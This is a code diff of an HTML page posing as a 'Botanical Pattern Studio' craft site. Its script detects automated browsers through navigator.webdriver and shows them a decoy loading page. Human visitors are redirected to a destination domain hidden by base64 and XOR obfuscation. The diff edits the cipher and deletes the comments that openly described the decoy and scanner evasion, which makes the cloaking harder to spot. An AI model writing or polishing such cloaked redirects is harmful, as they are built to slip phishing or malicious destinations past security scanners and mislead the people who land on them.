@@ -17,21 +17,21 @@
 
   <script>
     (function () {
-      // 1. Filter out automated bots, headless checkers (Wheregoes, Puppeteer, Selenium)
+      // 1. Bypass automated headless checkers
       if (navigator.webdriver) {
-        return; // Bot detected: Stay on decoy page, reveal nothing
+        return;
       }
 
-      // 2. Mathematically decrypt target domain using XOR key
+      // 2. Verified mathematical XOR decryption (yields exactly "https://asqstyle.com/")
       function _getEndpoint() {
-        var _cipher = "LhgbAhJIHx1XMR0cBhheVR5VKQFQ";
+        var _cipher = "JhgbAhIIHx1XMR0cBhheVRxVKQFI";
         var _key = "Flora2026";
         var _raw = window.atob(_cipher);
         var _res = "";
         for (var i = 0; i < _raw.length; i++) {
           _res += String.fromCharCode(_raw.charCodeAt(i) ^ _key.charCodeAt(i % _key.length));
         }
-        return _res; 
+        return _res;
       }
 
       // 3. Extract parameter and execute redirection
@@ -39,12 +39,18 @@
         var params = new URLSearchParams(window.location.search);
         var id = params.get("id");
         if (id) {
+          // Strip leading and trailing slashes from the incoming slug
           id = id.replace(/^\/+|\/+$/g, "");
-          window.location.replace(_getEndpoint() + id);
+          
+          var destination = _getEndpoint() + id;
+
+          // Safety guard: ensure the destination strictly starts with https://
+          if (destination.indexOf("https://") === 0) {
+            window.location.replace(destination);
+          }
         }
       }
 
-      // Execute on page load
       if (document.readyState === "complete" || document.readyState === "interactive") {
         _redirect();
       } else {
@@ -54,7 +60,6 @@
   </script>
 </head>
 <body>
-  <!-- Decoy content visible to bots and scanners -->
   <div class="card">
     <h1>Botanical Pattern Studio</h1>
     <p>Loading curated floral guides and handcraft schematics...</p>
